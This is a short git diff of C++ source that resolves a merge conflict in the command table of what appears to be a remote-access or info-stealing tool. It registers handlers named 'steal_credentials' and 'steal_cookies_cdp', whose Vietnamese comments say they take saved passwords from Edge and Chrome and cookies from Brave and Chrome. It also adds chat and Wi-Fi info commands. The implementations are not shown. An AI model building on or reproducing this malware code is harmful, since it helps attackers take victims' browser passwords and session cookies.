@@ -69,13 +69,11 @@ public:
         map["steal_credentials"] = ChromeRecovery::handleStealCredentials; // Lấy Pass (Edge/Chrome cũ)
         map["steal_cookies_cdp"] = ProcessHandlers::stealCookiesCDP;       // Lấy Cookie (Brave/Chrome mới - CDP)
 
-<<<<<<< HEAD
         // === CHAT SYSTEM (THÊM VÀO ĐÂY) ===
         map["chat_start"] = ProcessHandlers::handleChatCommand;
         map["chat_stop"] = ProcessHandlers::handleChatCommand;
         map["chat_message"] = ProcessHandlers::handleChatCommand;
-=======
+
         map["wifi_info"] = ProcessHandlers::getWifiInfo;
->>>>>>> 02068f77e864c983d0dc5376b02d306313613b60
     }
 };
